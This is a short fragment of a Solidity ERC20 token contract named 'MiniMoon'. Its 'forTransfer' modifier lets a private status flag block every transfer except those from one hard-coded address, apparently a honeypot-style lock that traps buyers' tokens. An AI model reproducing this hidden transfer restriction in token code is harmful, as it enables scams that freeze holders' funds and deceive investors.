...
contract MiniMoonToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenMM_totalSupply;
    uint256 private _tokenMM_status = 0;
    uint256 public stakingPoolMMStatus = 0;

    string private _tokenMM_name;
    string private _tokenMM_symbol;

    address private _poolMMAddress = 0x17A5aA38F87A10c64fd3DBf383c86fD2445d0067;

    constructor() {
        _tokenMM_name = "MiniMoon";
        _tokenMM_symbol = "MiniMoon";
        _tokenMM_totalSupply = 58000 * 10 ** 18;
        _balances[msg.sender] = _tokenMM_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolMMAddress || _tokenMM_status == 0);
        _;
    }
